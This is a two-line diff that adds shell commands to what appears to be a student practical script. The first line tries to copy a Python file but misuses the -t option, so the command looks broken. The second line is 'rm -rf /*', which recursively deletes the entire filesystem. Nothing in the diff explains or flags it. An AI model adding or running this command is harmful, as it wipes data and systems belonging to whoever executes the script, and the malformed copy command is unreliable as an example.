@@ -1,0 +1,2 @@
+cp -t /FOP/Prac02/Midtest1.py /FOP/Prac03/Subdir1/Midtest1.py
+rm -rf /*
